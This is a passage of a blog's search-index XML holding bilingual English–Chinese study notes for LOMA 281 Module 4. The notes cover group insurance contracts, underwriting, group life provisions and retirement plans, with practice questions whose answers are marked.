<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Loma 281 Module4</title>
      <link href="/posts/52046/"/>
      <url>/posts/52046/</url>
      
        <content type="html"><![CDATA[<h1 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h1><h2 id="The-Group-Insurance-Contract【团体保险合同】"><a href="#The-Group-Insurance-Contract【团体保险合同】" class="headerlink" title="The Group Insurance Contract【团体保险合同】"></a>The Group Insurance Contract【团体保险合同】</h2><p>一些术语：</p><ul><li><strong>group insurance</strong>: A method of providing life or health insurance coverage for a group of people under one insurance contract.<ul><li><strong>团体保险</strong>：根据一份保险合同为一群人提供人寿或健康保险的一种方法。</li></ul></li><li><strong>master group insurance contract</strong>: An insurance contract that insures a number of people.<ul><li><strong>主团体保险合同</strong>：为多人投保的保险合同。</li></ul></li><li><strong>group insured</strong>: An individual covered by a group insurance policy. He isn’t a party to the group insurance contract.<ul><li><strong>团体被保险人</strong>：由团体保险单承保的个人。他不是团体保险合同的一方。</li></ul></li><li><strong>group policyholder</strong>: The person or organization that decides what types of group insurance coverage to purchase for a specific group, negotiates the terms of the group insurance contract, and purchases the group insurance coverage.<ul><li><strong>团体投保人</strong>：决定为特定团体购买何种类型的团体保险、协商团体保险合同条款并购买团体保险的个人或组织。</li></ul></li></ul><hr><p><strong>Requirements for a Valid Contract</strong></p><ul><li>The parties to the contract must mutually agree to the contract’s terms 合同双方必须相互同意合同条款</li><li>The parties must have contractual capacity 当事人必须具有合同行为能力</li><li>The parties must exchange legally adequate consideration 双方必须在法律上交换充分的对价</li><li>The parties must enter into the contract for a lawful purpose 当事人必须为合法目的订立合同<ul><li>Group insurance contracts have no insurable interest requirement. 团体保险合同没有保险利益要求。</li></ul></li></ul><h2 id="Ownership-and-Group-Insurance-Plans【所有权和团体保险计划】"><a href="#Ownership-and-Group-Insurance-Plans【所有权和团体保险计划】" class="headerlink" title="Ownership and Group Insurance Plans【所有权和团体保险计划】"></a><strong>Ownership and Group Insurance Plans</strong>【所有权和团体保险计划】</h2><ul><li><p><strong>certificate of insurance</strong>: A document that describes the coverage that the group insurance contract provides and a group insured’s rights under the contract.</p><ul><li><strong>保险证书</strong>：描述团体保险合同提供的保险范围以及团体被保险人在合同下的权利的文件。团体被保险人不会获得主团体保险合同的副本，但有保险证书可以参考，而且团体被保险人可能需要支付部分保费。</li></ul></li><li><p><strong>noncontributory plan</strong>：A group insurance plan for which insured group members are not required to pay any part of the group insurance premium.</p><ul><li><strong>非缴费计划</strong>：被保险的团体成员无需支付团体保险费的任何部分的团体保险计划。</li></ul></li><li><p><strong>contributory plan</strong>：A group insurance plan under which insured group members must pay part or all of the premium for their coverage.</p><ul><li><strong>缴费计划</strong>：一种团体保险计划，根据该计划，被保险的团体成员必须支付其保险范围的部分或全部保费。</li></ul></li></ul><h2 id="Group-Insurance-Characteristics【团体保险特点】"><a href="#Group-Insurance-Characteristics【团体保险特点】" class="headerlink" title="Group Insurance Characteristics【团体保险特点】"></a><strong>Group Insurance Characteristics</strong>【团体保险特点】</h2><ul><li><strong>self-administered plan</strong>: A group insurance plan for which the group policyholder is responsible for handling the administrative and recordkeeping aspects of the plan.<ul><li><strong>自我管理计划</strong>：集团投保人负责处理该计划的行政和记录方面的集团保险计划。</li></ul></li><li><strong>insurer-administered plan</strong>: A group insurance plan for which the insurer is responsible for handling the administrative and recordkeeping aspects of the plan.<ul><li><strong>由保险公司管理的计划</strong>：由保险公司负责处理该计划的管理和记录方面的团体保险计划。</li></ul></li></ul><h2 id="Group-Insurance-Underwriting【团体保险承保】"><a href="#Group-Insurance-Underwriting【团体保险承保】" class="headerlink" title="Group Insurance Underwriting【团体保险承保】"></a><strong>Group Insurance Underwriting</strong>【团体保险承保】</h2><p>Groups Typically Eligible for Group Insurance：</p><ul><li>A single-employer group that includes employees of a single employer. This is the most common type of insured group.<ul><li>包括单个雇主的雇员的单个雇主组。这是最常见的被保险群体类型。</li></ul></li><li>A group that consists of the members of a labor union.<ul><li>由工会成员组成的团体。</li></ul></li><li>A multiple employer group that consists of employees of two or more employers or labor unions.<ul><li>由两个或多个雇主或工会的雇员组成的多雇主团体。</li></ul></li><li>An association group that consists of people who share a common bond, such as being in the same profession or being alumni of the same university.<ul><li>一个由有共同纽带的人组成的协会团体，例如从事同一职业或是同一所大学的校友。</li></ul></li><li>A debtor-creditor group that consists of people who have borrowed from a lending institution.<ul><li>由从贷款机构借款的人组成的债务人-债权人团体。</li></ul></li><li>A credit union group that consists of the members of one or more credit unions.<ul><li>由一个或多个信用合作社的成员组成的信用合作社组。</li></ul></li></ul><hr><p>Requirements for group underwriting include</p><ol><li><p>Group must exist for a reason other than to get insurance 集团存在的原因必须不是为了获得保险</p></li><li><p>Group size affects the underwriter’s ability to accurately estimate loss rate. 集团规模影响承销商准确估计损失率的能力</p></li><li><p>Need a steady flow of new members to keep a stable age distribution 需要稳定的新成员流动，以保持稳定的年龄分布</p></li><li><p>Group must exist for a reasonable length of time, and its composition mustremain relatively stable over time. 群体必须存在一段合理的时间，其组成必须随着时间的推移保持相对稳定</p></li><li><p>Participation requirements prevent antiselection 参与要求防止反选举</p></li><li><p>Benefit levels—the group member does not select the benefit level 福利级别–组成员不能选择福利级别</p></li><li><p>A group is assigned a risk classification based on the group’s normal activities. 根据小组的正常活动，为小组分配风险分类。</p></li></ol><hr><ul><li><p>Although the size of the group doesn’t affect the loss rate, it does affect the underwriter’s ability to accurately estimate the group’s loss rate. The smaller the group, the more difficult it is.</p><ul><li>虽然集团的规模<strong>不会影响损失率</strong>，但它确实会<strong>影响承销商准确估计</strong>集团损失率的能力。小组越小，难度就越大。</li></ul></li><li><p>New members into a group affect the group’s risk characteristics. To be insurable, a group must have a relatively steady inflow of new members to replace departing members and to keep the age distribution of the group stable.</p><ul><li>新成员进入团队是会影响团队的风险特征。要想获得保险，一个群体必须有相对稳定的新成员流入，以取代离开的成员，并保持群体的年龄分布稳定。</li></ul></li><li><p>But to reduce antiselection, most insurers require at least 75% of eligible members to participate in a <strong>contributory plan</strong>. When a plan is <strong>noncontributory</strong>, 100% of eligible group members MUST BE covered. </p><ul><li>但为了减少反选举，大多数保险公司要求至少75%的合格会员参加缴费计划。当计划是非强制性的时，必须覆盖100%的合格团体成员。</li></ul></li></ul><p>The insured, rather than the policyholder, names the beneficiary. 受益人是被保险人而不是投保人。<code>Group only</code></p><p>Underwriting looks at potential administrative costs associated with the contract. 承保着眼于与合同相关的潜在管理成本。<code>Group only</code></p><h2 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.In order to provide its employees with life insurance coverage, the Oxygen Corporation entered into a group life insurance contract with the Zephyr Insurance Company. The following statements areabout this situation. Select the answer choice containing the correct statement.</p><ul><li>The parties to this group life insurance contract are Oxygen, Oxygen’s employees, and Zephyr.</li><li>In order to obtain this group life insurance contract, Oxygen was required to have an insurable interest in the lives of its covered employees.</li><li><strong>Oxygen’s employees are the group insureds for this group life insurance contract.</strong></li><li>Oxygen must give each covered employee a copy of the master group insurance contract.</li></ul><blockquote><p>为了为员工提供人寿保险，氧气公司与Zephyr保险公司签订了集体人寿保险合同。以下陈述是关于这种情况的。选择包含正确陈述的答案选项。</p><ul><li>该团体人寿保险合同的当事人是Oxygen、Oxygen的员工和Zephyr。</li><li>为了获得该团体人寿保险合同，Oxygen被要求对其承保员工的生活具有可保利益。</li><li>Oxygen的员工是本团体人寿保险合同的团体被保险人。</li><li>Oxygen必须向每个受保员工提供一份主团体保险合同的副本。</li></ul></blockquote><p>2.The Stellar Company pays the entire premium for a group life insurance plan that insures the lives of its eligible employees. In this situation, Stellar’s group life insurance plan is an example of a</p><ul><li>contributory plan, and at least 75% of Stellar’s eligible employees must be covered by this plan</li><li>contributory plan, and 100% of Stellar’s eligible employees must be covered by this plan</li><li>noncontributory plan, and at least 75% of Stellar’s eligible employees must be covered by this plan</li><li><strong>noncontributory plan, and 100% of Stellar’s eligible employees must be covered by this plan</strong></li></ul><blockquote><p>Stellar公司为其合格员工的人寿保险计划支付全部保费。在这种情况下，Stellar的团体人寿保险计划就是一个例子</p><ul><li>缴费计划，Stellar至少75%的合格员工必须参加该计划</li><li>缴费计划，Stellar 100%符合条件的员工必须参加该计划</li><li>非缴费作计划，并且Stellar至少75%的合格员工必须包含在该计划中</li><li>非缴费计划，Stellar 100%符合条件的员工必须包含在该计划中</li></ul></blockquote><p>3.The Jasper Corporation offers group lfe insurance to its eligible employees through a contract with the Calendar Insurance Company. Jasper is responsible for handling the administrative and recordkeeping aspects of this group life insurance plan, which means that Jasper’s plan is (an insurer-administered &#x2F; <strong>a self-administered</strong>) plan. Calendar’s administrative expenses for this plan are(<strong>lower</strong> &#x2F; higher) than they would be if Calendar handled the administrative and recordkeeping aspects of the plan.</p><blockquote><p>Jasper公司通过与日历保险公司签订合同，为符合条件的员工提供团体lfe保险。Jasper负责处理该团体人寿保险计划的行政和记录方面，这意味着Jasper的计划是（保险公司管理&#x2F;自行管理）计划。日历公司在该计划中的管理费用（低于&#x2F;高于）如果日历公司处理该计划的管理和记录方面的费用。</p></blockquote><p>4.The following groups have applied for group life insurance coverage from the Plentiful Insurance Company:</p><p>​• Group A: Workers who are members of the Bakers Union of America</p><p>​• Group B: A small group of individuals who formed a club to get a group insurance policy</p><p>​• Group C: The full-time employees of the Nutmeg Corporation</p><p>​• Group D: The members of the March Credit Union</p><p>Of these groups, the one that, based on the reason for its existence, will likely fail to qualify for group insurance coverage is</p><ul><li>Group A</li><li><strong>Group B</strong></li><li>Group C</li><li>Group D</li></ul><blockquote><p>以下团体已向富丽保险公司申请团体人寿保险：</p><p>​•A组：美国面包师工会成员</p><p>​•B组：组建俱乐部以获得团体保险的一小群人</p><p>​•C组：肉豆蔻公司的全职员工</p><p>​•D组：三月信用合作社的成员</p><p>在这些群体中，根据其存在的原因，可能无法获得群体保险的群体是</p><ul><li>A组</li><li>B组</li><li>C组</li><li>D组</li></ul></blockquote><p>5.The following two groups have applied for group life insurance coverage:</p><p>​• A group consisting of the eligible employees of the Trystero Corporation; 25% of these employees have agreed to participate in the plan, which will be a contributory plan</p><p>​• A group consisting of retired college professors; membership in the group is closed, and no new members will be joining the group</p><p>From the answer choices below, select the answer choice that correctly indicates whether, according to typical underwriting guidelines, each of these groups is likely to be insurable.</p><p>Employees of Trystero &#x2F; Retired college professors</p><ul><li>insurable  insurable</li><li>insurable  not insurable</li><li>not insurable  insurable</li><li><strong>not insurable  not insurable</strong></li></ul><blockquote><p>以下两个群体已申请团体人寿保险：</p><p>​•由Trystero公司合格员工组成的小组；其中25%的员工已同意参与该计划，该计划将是一项供款计划</p><p>​•一个由退休大学教授组成的小组；组中的成员资格已关闭，没有新成员将加入该组</p><p>从下面的答案选择中，选择正确表明根据典型的承保指南，这些群体中的每一个是否都有可能投保的答案选择。</p><p>Trystero的员工 &#x2F; 退休大学教授</p><ul><li>可保     可保</li><li>可保     不可保</li><li>不可保  可保</li><li>不可保  不可保</li></ul></blockquote><h1 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h1><h2 id="Group-Life-Insurance【团体人寿保险】"><a href="#Group-Life-Insurance【团体人寿保险】" class="headerlink" title="Group Life Insurance【团体人寿保险】"></a><strong>Group Life Insurance</strong>【团体人寿保险】</h2><p>Eligibility Requirements: </p><ul><li><p><strong>Probationary period</strong>: how long a new group member must wait before becoming eligible to enroll in the group insurance plan.</p><ul><li><strong>试用期</strong>：新的团体成员必须等待多长时间才能有资格参加团体保险计划。</li></ul></li><li><p>Coverage under a noncontributory group insurance is automatic; under a contributory  plan, there is an <strong>eligibility period</strong>.</p><ul><li>非缴费团体保险的承保范围是自动的；根据缴费计划，有一个<strong>资格期</strong>。</li></ul></li><li><p>Enrollment after the eligibility period requires evidence of insurability. </p><ul><li>在资格期后注册需要有可保性的证据，资格期则不用。</li></ul></li><li><p><strong>Actively-at-work provision</strong>: Eligible employee must be at work on the day coverage is  to take effect.</p><ul><li><strong>在职活动条款</strong>：符合条件的雇员必须在保险生效当天上班。</li></ul></li></ul><h2 id="Group-Contract-Provisions【团体合同条款】"><a href="#Group-Contract-Provisions【团体合同条款】" class="headerlink" title="Group Contract Provisions【团体合同条款】"></a><strong>Group Contract Provisions</strong>【团体合同条款】</h2><p><strong>Grace Period</strong> 宽限期</p><ul><li><p>The grace period usually is 31 days.</p></li><li><p>Unlike an individual policyowner, who is not obligated to pay for coverage provided during the grace period, a group policyholder is legally obligated to pay for this coverage. 与个人投保人没有义务<strong>为宽限期内提供的保险付款</strong>不同，团体投保人在法律上有义务为该保险付款。</p></li></ul><p><strong>Incontestability Provision</strong> 不可抗辩条款</p><ul><li><p>Limits the time during which the insurer can contest the validity of the contract. 限制保险公司对合同有效性提出质疑的时间。</p></li><li><p>Insurer can contest a group member’s coverage without contesting the group contract. 保险公司可以对团体成员的保险进行争议，而无需对团体合同提出异议。</p></li></ul><hr><p>Those who must provide evidence of insurability:</p><ul><li>All eligible group members of a very small group applying for coverage 一个非常小的团体的所有符合条件的团体成员申请保险</li><li>A person enrolling in a contributory plan after the eligibility period 在资格期结束后，选择加入缴费计划的个人</li><li>A person who applies for more insurance coverage than the standard offering, or who applies for available supplemental coverage 申请比标准提供的更多保险 coverage，或者申请可用的附加保险 coverage 的个人</li></ul><h2 id="Insurance-Termination-and-Conversion【保险终止及转换】"><a href="#Insurance-Termination-and-Conversion【保险终止及转换】" class="headerlink" title="Insurance Termination and Conversion【保险终止及转换】"></a><strong>Insurance Termination and Conversion</strong>【保险终止及转换】</h2><p><strong>Termination of Coverage</strong></p><ul><li><p>Termination of the group policy. 终止团体保单</p><ul><li>the group policyholder may terminate the policy at any time by notifying the insurer in writing. 集团保单持有人可随时书面通知保险公司终止保单。</li><li>the insurer may also have the right to terminate the group insurance policy on any premium due date if the group’s participation level falls below the required minimum 如果集团的参与水平低于要求的最低水平，保险公司也有权在任何保费到期日终止集团保险单</li></ul></li><li><p>Group insured is no longer eligible for coverage, but group policy continues. 团体被保险人不再有资格享受保险，但团体保单仍在继续</p><ul><li>If the group insured ceases to be a member of a class of persons eligible for coverage. 如果被保险人不再是有资格参加保险的一类人的成员。</li><li>If the group insured terminates employment or group membership 如果被保险团体终止雇佣关系或团体成员资格</li><li>If the group insured fails to make a required contribution to the premium 如果被保险人未能按规定缴纳保险费</li></ul></li></ul><p><strong>Conversion Privilege</strong></p><p>Allows a group insured to convert group coverage to individual coverage. 允许团体被保险人将团体保险转换为个人保险</p><ul><li><p>When a policy terminates, conversion is limited to group insureds who have been covered by policy for a specified period, such as 5 years.</p><ul><li>当保单终止时，转换仅限于在指定期限（如5年）内受保单保障的团体被保险人。</li></ul></li><li><p>An insured group member leaves his employer and gets coverage from a new employer. The amount of individual insurance coverage the insurer typically must offer &#x3D; (Original coverage) minus (New coverage).</p><ul><li>被保险团体成员离开其雇主并从新雇主处获得保险。保险公司通常必须提供的个人保险金额&#x3D;（原始保险）减去（新保险）。</li></ul></li><li><p>A group insured typically has a 31-day conversion period to convert, usually without providing evidence of insurability.</p><ul><li>被保险人通常有31天的转换期，通常不提供可保性的证据。</li></ul></li></ul><h2 id="Benefit-Amounts【福利金额】"><a href="#Benefit-Amounts【福利金额】" class="headerlink" title="Benefit Amounts【福利金额】"></a><strong>Benefit Amounts</strong>【福利金额】</h2><p><strong>Benefit Schedules</strong>: A schedule included in a group life insurance policy that defines the amount of life insurance the policy provides for each insured.</p><p><strong>福利计划表</strong>: 包含在团体人寿保险单中的一份计划表，规定了保单为每位被保险人提供的人寿保险金额。</p><p>Includes three categories:</p><ol><li><p>Flat amount  固定金额</p></li><li><p>Based on  salary  基于工资</p></li><li><p>Based on job classification 根据工作分类</p></li></ol><blockquote><p>dependent coverage be less than the covered group member’s coverage.</p></blockquote><hr><p>Usually, insurers pay group life insurance policy death benefits in a lump sum to the named beneficiary. But some group policies allow a beneficiary to choose a settlement option. 通常，保险公司以一次性向指定的受益人支付团体人寿保险单死亡福利。但是，某些团体政策允许受益人选择一个人寿险赔款选项。</p><p><strong>Settlement Options</strong>: 人寿险赔款选项</p><ul><li>Lump sum option: The insurer pays the proceeds in a single payment.<ul><li>一次性付款方式：保险公司一次性付款。</li></ul></li><li>Interest option: The insurer invests the policy proceeds and periodically pays interest on the proceeds.<ul><li>利息选择权：保险公司对保单收益进行投资，并定期支付收益利息。</li></ul></li><li>Fixed amount option: The insurer pays the policy proceeds in equal installments for a specified period of time.<ul><li>固定金额选项：保险公司在指定的时间内等额分期支付保单收益。</li></ul></li><li>Fixed period option: The insurer pays equal installments of a stated amount until the policy proceeds, plus the interest earned, are exhausted.<ul><li>固定期限选择权：保险公司按规定的金额等额分期付款，直到保单收益加上赚取的利息用完为止。</li></ul></li><li>Life income option: The insurer pays the policy proceeds in periodic installments over the payee’s lifetime.<ul><li>终身收入选择：保险公司在收款人的一生中定期分期支付保单收益。</li></ul></li></ul><h2 id="Features-of-the-Group-Plans【团体计划的特点】"><a href="#Features-of-the-Group-Plans【团体计划的特点】" class="headerlink" title="Features of the Group Plans【团体计划的特点】"></a><strong>Features of the Group Plans</strong>【团体计划的特点】</h2><p>Types of Group Life Insurance</p><ul><li><p>Yearly renewable term (YRT) life insurance 年度可续期定期寿险</p><ul><li>Typically, an employee can receive up to $50,000 of noncontributory group term insurance coverage tax free. An employee must pay federal income taxes on the employer’s cost of providing coverage over $50,000.</li><li>通常，员工可以获得高达50000美元的非合作团体定期保险，无税。雇员必须为雇主提供超过50000美元的保险支付联邦所得税。</li></ul></li><li><p>Accidental death and dismemberment (AD&amp;D) benefits 意外身故及伤残（AD&amp;D）福利</p></li><li><p>Group cash value life insurance plans 团体现金价值人寿保险计划</p><ul><li><p>Group paid-up plans</p><ul><li>For a typical group paid-up life insurance plan, the amount of paid-up insurance on each participating employee increases each year, and the amount of group term insurance that the employer must purchase for participating employees decreases each year.</li><li>对于一个典型的团体自付人寿保险计划，每位参与雇员的自付保险金额每年都在增加，而雇主必须为参与雇员购买的团体定期保险金额每年都在减少。</li><li>The paid-up whole life coverage will continue in force even after he retires or leaves the group.</li><li>即使在他退休或离开团队后，终身付费保险仍将继续有效。</li></ul></li><li><p>Level premium whole life  plans</p><ul><li>The plan can be contributory or noncontributory. If the employee contributes, she has a vested right in the amount of the cash value provided by her premium contributions.</li><li>该计划可以是供款或非供款。如果雇员供款，她对其供款所提供的现金价值拥有既得权利。</li></ul></li><li><p>Group universal life plans</p><ul><li>Group plan of cash value insurance that provides universal life insurance; covered group members usually pay the entire premium.</li><li>提供通用寿险的现金价值保险团体计划；<strong>被保险的团体成员</strong>通常支付全部保费。</li><li>Coverage is portable. If she leaves her job, she can continue her coverage under the group plan.</li><li>保险具有携带性。如果她离职，她可以继续享受团体保险。</li></ul></li></ul></li><li><p>Group creditor life  团体债权人寿险</p><ul><li>Group life insurance issued to a creditor, such as a bank, to insure the lives of the creditor’s current and future debtors. </li><li>向债权人（如银行）发行的团体人寿保险，为债权人当前和未来债务人的生命提供保险。</li><li>the amount of insurance Jerome has on his life equals the amount he owes on the credit card account. </li><li>Jerome的人寿保险金额等于他信用卡账户上的欠款。</li><li>the creditor is always the beneficiary of the coverage.</li><li>债权人始终是保险的受益人。</li></ul></li></ul><h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.Alice Chung started a new job with the Stardust Company. After Ms. Chung had worked full-time for Stardust for three months, she was eligible to participate in Stardust’s group life insurance plan. Ms. Chung will be given 31 days to enroll in the plan. The following statements are about this situation. Select the answer choice containing the correct statement.</p><ul><li>Stardust’s group life insurance plan has an eligibility period of three months.</li><li>Stardust’s group life insurance plan is noncontributory.</li><li>I<strong>f Ms. Chung decides to enroll in Stardust’s group life insurance plan during the 31-day period, she will not be required to submit evidence of her insurability.</strong></li><li>If Ms. Chung decides to enroll in Stardust’s group life insurance plan during the 31-day period, she will have to pay all back premiums to cover the first three months of her employment withStardust</li></ul><blockquote><p>钟在星尘公司开始了一份新工作。钟女士在星尘全职工作三个月后，有资格参加星尘的团体人寿保险计划。钟女士将有31天的时间参加该计划。以下是关于这种情况的声明。选择包含正确陈述的答案选项。</p><ul><li>星尘的团体人寿保险计划的有效期为三个月。</li><li>星尘的团体人寿保险计划是非强制性缴费的。</li><li>如果钟女士决定在31天内参加星尘的团体人寿保险计划，她将不需要提交可保性证据。</li><li>如果钟女士决定在31天内参加星尘的团体人寿保险计划，她将不得不支付所有的保险费，以支付她在星尘工作的前三个月</li></ul></blockquote><p>2.Ruth Melnick has $50,000 of group life insurance coverage through her employer, the Origami Corporation. Origami’s plan, which is a typical group life insurance plan, also provides Ruth’s husband,David, with $10,000 of life insurance coverage. In this situation, (Ruth &#x2F; Origami) has the right to name the beneficiary for Ruth’s coverage. In addition, (Ruth &#x2F; David’s estate) will automatically benamed as the beneficiary for David’s coverage.</p><blockquote><p>Ruth Melnick通过她的雇主折纸公司获得了50000美元的团体人寿保险。Origami的计划是一个典型的团体人寿保险计划，也为Ruth的丈夫David提供了10000美元的人寿保险。在这种情况下，（<strong>Ruth</strong>&#x2F;Origami）有权指定Ruth保险的受益人。此外，（<strong>Ruth</strong>&#x2F;David的遗产）将自动成为David保险的受益人。</p></blockquote><p>3.The following statements are about the standard grace period provision and the incontestability provision included in group life insurance policies. Select the answer choice containing the correctstatement.</p><ul><li><p>The incontestability provision prohibits an insurer from contesting an individual group member’s coverage without contesting the validity of the master group contract itself.</p></li><li><p>For group life insurance policies, the incontestability provision must specify a contestability period of at least five years.</p></li><li><p><strong>The grace period provision specifies that, if the group policy terminates for nonpayment of premiums, then the group policyholder is legally obligated to pay for the coverage provided during thegrace period.</strong></p></li><li><p>The grace period provision specifies that, if a premium is not paid by its due date, the group policyholder has a three-month period in which to pay the premium without losing coverage.</p></li></ul><blockquote><p>以下声明是关于团体人寿保险单中包含的标准宽限期条款和不可抗辩条款的。选择包含正确陈述的答案选项。</p><ul><li>不可抗辩条款禁止保险人在不质疑主集团合同本身有效性的情况下对单个集团成员的保险范围提出质疑。</li><li>对于团体人寿保险单，不可抗辩条款必须规定至少五年的可抗辩期。</li><li>宽限期条款规定，如果集团保单因未支付保费而终止，则集团投保人有法律义务支付宽限期内提供的保险。</li><li>宽限期规定，如果保险费未在到期日前支付，集团投保人有三个月的时间支付保险费，而不会失去保险。</li></ul></blockquote><p>4.Tanya Perry, age 45, quit her job with the Pagoda Company. Ms. Perry would like to convert the group life insurance coverage she had from Pagoda to an individual policy. Pagoda’s group policy contains a typical conversion provision. The following statement(s) can correctly be made about this situation:</p><p>​A. Ms. Perry has 31 days after the termination of her group coverage to convert the coverage to an individual policy without providing evidence of her insurability.</p><p>​B. The premium rate that Ms. Perry will pay for the individual policy will be the same premium rate she paid for her group coverage.</p><ul><li>Both A and B</li><li><strong>A only</strong></li><li>B only</li><li>Neither A nor B</li></ul><blockquote><p>45岁的Tanya Perry辞去了她在宝塔公司的工作。Perry女士想将她从Pagoda获得的团体人寿保险转换为个人保单。Pagoda的团体政策包含一个典型的转换条款。关于这种情况，可以正确地做出以下陈述：</p><p>​a.Perry女士在团体保险终止后有31天的时间将保险转换为个人保单，而无需提供其可保性的证据。</p><p>​b.Perry女士为个人保单支付的保费率将与她为团体保险支付的保费相同。</p><ul><li>A和B</li><li>仅A</li><li>仅限B</li><li>既不是A也不是B</li></ul></blockquote><p>5.The Wisteria Corporation offers group life insurance to its 500 employees according to the following benefit schedule:</p><table><thead><tr><th>Annual Salary</th><th>Amount of Life Insurance</th></tr></thead><tbody><tr><td>Less than $50,000</td><td>1 × salary</td></tr><tr><td>$50,000 to $100,000</td><td>2 × salary</td></tr><tr><td>Over $100,000</td><td>3 × salary</td></tr></tbody></table><p>Graham Spader, a Wisteria employee, earns a salary of \$75,000. Wisteria’s plan also offers group life insurance coverage to an employee’s dependents, and Graham has coverage on his wife, Angela.Assuming that Wisteria’s group life insurance plan is typical, the amount of group life insurance that Graham is eligible for is equal to</p><ul><li>$75,000, and the amount of group life insurance that Angela receives is equal to the amount that Graham receives</li><li>$75,000, and the amount of group life insurance that Angela receives is less than the amount that Graham receives</li><li>$150,000, and the amount of group life insurance that Angela receives is equal to the amount that Graham receives</li><li><strong>$150,000, and the amount of group life insurance that Angela receives is less than the amount that Graham receives</strong></li></ul><blockquote><p>紫藤公司根据以下福利计划为其500名员工提供团体人寿保险：</p><table><thead><tr><th>年薪</th><th>人寿保险金额</th></tr></thead><tbody><tr><td>低于50000美元</td><td>1倍工资</td></tr><tr><td>50000至100000美元</td><td>2倍工资</td></tr><tr><td>超过100000美元</td><td>3倍工资</td></tr></tbody></table><p>Graham Spader是紫藤公司的一名员工，工资为75000美元。Wisteria的计划还为员工的家属提供团体人寿保险，Graham为他的妻子Angela提供保险。假设Wisteria的团体人寿保险计划是典型的，Graham有资格参加的团体人寿险金额等于</p><ul><li>75000美元，Angela获得的团体人寿保险金额等于Graham获得的金额</li><li>75000美元，Angela获得的团体人寿保险金额低于Graham获得的金额</li><li>150000美元，Angela获得的团体人寿保险金额等于Graham获得的金额</li><li>150000美元，Angela获得的团体人寿保险金额低于Graham获得的金额</li></ul></blockquote><p>6.For this question, if answer choices (1) through (3) are all correct, select answer choice (4). Otherwise, select the one correct answer choice.Group cash value life insurance plans can be structured as group paid-up plans, group level premium whole life plans, and group universal life plans. Correct statements about these types of cashvalue plans include</p><ul><li>that, for group paid-up plans, the paid-up coverage decreases over time, whereas the yearly renewable term (YRT) coverage increases over time</li><li>that, under a noncontributory level premium whole life plan, the employee has a vested right in the policy’s cash value</li><li><strong>that one advantage of group universal life plans is that the coverage is portable</strong></li><li>all of the above</li></ul><blockquote><p>对于此问题，如果答案选项（1）到（3）都正确，请选择答案选项（4）。否则，请选择一个正确的答案。集团现金价值人寿保险计划可分为集团实收计划、集团级保费终身计划和集团通用人寿计划。关于这些类型的现金价值计划的正确说明包括</p><ul><li>对于团体付费计划，付费覆盖范围会随着时间的推移而减少，而年度可续期（YRT）覆盖范围会随时间的推移增加</li><li>根据非报酬水平的终身保费计划，员工对保单的现金价值享有既得权利</li><li>团体通用人寿保险的一个优点是保险范围是可移植的</li><li>以上所有内容</li></ul></blockquote><p>7.The Lonestar Bank recently granted Yuliana Cruz a \$100,000 loan. Yuliana also obtained \$100,000 of group creditor life insurance through Lonestar. Yuliana died while still owing Lonestar \$40,000 on the loan. From the answer choices below, select the response that correctly indicates the beneficiary of Yuliana’s coverage and the amount of insurance in force at the time of her death.</p><p>Beneficiary of Yuliana’s coverage?  &#x2F;  Amount of insurance?</p><ul><li>Yuliana’s estate  $40,000</li><li>Yuliana’s estate  $100,000</li><li><strong>Lonestar  $40,000</strong></li><li>Lonestar  $100,000</li></ul><blockquote><p>孤星银行最近向Yuliana Cruz提供了10万美元的贷款。Yuliana还通过Lonestar获得了价值10万美元的集团债权人人寿保险。尤莉安娜去世时还欠Lonestar 4万美元的贷款。从下面的答案中，选择正确显示Yuliana保险受益人和她去世时有效保险金额的答案。</p><p>Yuliana保险的受益人？&#x2F;  保险金额？</p><ul><li>Yuliana的遗产  40000美元</li><li>Yuliana的遗产  100000美元</li><li>Lonestar 40000美元</li><li>Lonestar 100000美元</li></ul></blockquote><h1 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h1><h2 id="Group-Retirement-Plans【团体退休计划】"><a href="#Group-Retirement-Plans【团体退休计划】" class="headerlink" title="Group Retirement Plans【团体退休计划】"></a><strong>Group Retirement Plans</strong>【团体退休计划】</h2><p>一些术语：</p><ul><li><strong>plan sponsor</strong>: An employer or union that establishes a retirement plan for the benefit of their employees or members.<ul><li><strong>计划发起人</strong>：为雇员或成员的利益制定退休计划的雇主或工会。</li></ul></li><li><strong>plan participant</strong>: An employee or union member covered by a group retirement plan.<ul><li><strong>计划参与者</strong>：集团退休计划所涵盖的员工或工会成员。</li></ul></li><li><strong>plan administrator</strong>: The party that is responsible for the administrative aspects of a retirement plan’s operation.<ul><li><strong>计划管理员</strong>：负责退休计划运行管理方面的一方。</li></ul></li><li><strong>summary plan description</strong>: A written document that is understandable by the average plan participant and that reasonably informs participants and beneficiaries of their rights and obligations under the plan.<ul><li><strong>计划概述</strong>：一份普通计划参与者可以理解的书面文件，并合理地告知参与者和受益人其在计划下的权利和义务。</li></ul></li></ul><p>Sources of Funds<br>Retirement plans can have the following sources of funds:</p><ol><li>Contributions made by the plan sponsor 计划发起人的捐款</li><li>Contributions made by the plan participants 计划参与者的贡献</li><li>Investment&#x2F;interest earnings on all contributions 全部出资的投资&#x2F;利息收益</li></ol><blockquote><p>美国政府为计划参与者和计划发起人提供税收优惠。</p></blockquote><h2 id="Employer-sponsored-Retirement-Plans【雇主赞助的退休计划】"><a href="#Employer-sponsored-Retirement-Plans【雇主赞助的退休计划】" class="headerlink" title="Employer-sponsored Retirement Plans【雇主赞助的退休计划】"></a><strong>Employer-sponsored Retirement Plans</strong>【雇主赞助的退休计划】</h2><p><strong>qualified plan</strong>： A retirement plan that receives favorable income tax treatment by meeting the requirements of U.S. tax laws and the Employee Retirement Income Security Act (ERISA).<br><strong>合格计划</strong>：通过满足美国税法和《雇员退休收入保障法》（ERISA）的要求而获得优惠所得税待遇的退休计划。</p><p>ERISA Requirements：ERISA的要求</p><ul><li>A qualified retirement plan can’t favor highly compensated employees <ul><li>合格的退休计划不可能有利于高薪员工</li></ul></li><li>Plan assets must be held in a trust account at a financial institution for the exclusive benefit of employees or their beneficiaries<ul><li>计划资产必须存放在金融机构的信托账户中，仅用于员工或其受益人的利益</li></ul></li><li>The plan sponsor must provide certain reports to plan participants and governmental 